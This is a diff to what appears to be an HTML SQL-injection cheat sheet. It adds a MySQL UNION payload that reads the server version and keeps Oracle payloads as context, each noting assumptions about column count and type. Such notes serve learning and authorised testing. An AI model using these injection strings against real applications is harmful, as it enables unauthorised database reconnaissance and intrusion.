@@ -115,10 +115,9 @@ is needed.
 <b>ORACLE:</b><mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | <mark>' UNION SELECT banner,NULL FROM v$version--</mark>
 *assuming it has two columns and both are type string.
 
-<b>MYSQL:</b>
-
-<b>SQL:</b>
-
+<b>MYSQL | SQL:</b> <mark>' UNION SELECT @@version,NULL#</mark>
+*assuming it has two columns and first is type string.
+	
 <b>POSTGRESQL:</b></p>
 </details>
 <details>
